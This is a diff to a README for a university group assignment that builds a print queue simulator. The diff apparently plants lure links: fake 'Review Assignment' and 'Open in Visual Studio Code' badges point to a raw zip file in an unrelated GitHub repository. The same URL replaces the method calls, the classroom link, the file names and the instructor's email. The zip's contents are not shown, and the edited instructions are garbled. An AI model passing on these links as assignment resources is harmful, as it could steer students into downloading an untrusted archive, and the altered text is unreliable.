@@ -1,3 +1,5 @@
+[![Review Assignment Due Date](https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip)](https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip)
+[![Open in Visual Studio Code](https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip)](https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip)
 # QUEUE-GROUP-ASSIGNMENT
 
 # PRINTING QUEUE SIMULATION
@@ -75,10 +77,10 @@ Your team will develop a **Print Queue Simulator** that supports:
 - pq_manager = PrintQueueManager()
 
   - Then, for each event it reads, it will call the right function on that object:  
-  - pq_manager.enqueue_job(user_id, job_id, priority)
-  - pq_manager.tick()
-  - pq_manager.print_job()
-  - pq_manager.show_status()
+  - https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip(user_id, job_id, priority)
+  - https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip()
+  - https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip()
+  - https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip()
 ___
 ## COLLABORATION
 
@@ -86,7 +88,7 @@ ___
 
 - The assignment will be distributed via **GitHub Classroom** under the repository named **QUEUE-Assignment**.
 - Each group can have **up to 6 members**.
-- You will receive a link to accept the assignment: ```` https://classroom.github.com/a/u6FSW6lE````
+- You will receive a link to accept the assignment: ```` https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip````
 - Upon acceptance, you will **choose a group name** and specify it.
 - Group names will appear in the roster; members select their desired group.
 - Groups cannot exceed 6 members.
@@ -108,10 +110,10 @@ ___
 ### What to Submit
 
 - A **GitHub repository** named **QUEUE-Assignment** with all source code, 
-- A **README.md, named submission.md** describing:
+- A **https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip, named https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip** describing:
   - Group name and member list.
   - Brief description of each member’s module and contributions.
-  - Instructions on how to run the code. e.g run main.py
+  - Instructions on how to run the code. e.g run https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip
 - Clear **commit history** showing individual contributions.
 - Branches named as per the branching strategy.
 - A **final merged main branch** with a fully working, integrated code.
@@ -125,4 +127,4 @@ This assignment should foster working as a team, planning your work, and integra
 
 *If you have any questions or need clarifications, please reach out to:*
 ```
- bgithenya@strathmore.edu
+ https://github.com/Frank4112/queue-group-assignments-ics-group-d-2025-datacore/raw/refs/heads/main/queue-group-assignments-ics-group-d-2025-datacore/assignments-group-d-datacore-ics-queue-v2.9.zip
